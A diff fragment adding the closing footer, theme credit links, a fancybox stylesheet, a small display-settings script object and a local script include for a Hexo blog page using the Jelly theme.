+          <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/preccrep/hexo-theme-jelly" target="_blank">Jelly</a>
+        </div>
+    </div>
+  </div>
+</footer>
+    </div>
+    
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+
+
+<script>
+	var yiliaConfig = {
+		fancybox: true,
+		mathjax: false,
+		animate: true,
+		isHome: false,
+		isPost: true,
+		isArchive: false,
+		isTag: false,
+		isCategory: false,
+		open_in_new: false
+	}
+</script>
+
+<script src="/js/main.js"></script>
+
+
+
+
+  </div>
+</body>
+</html>
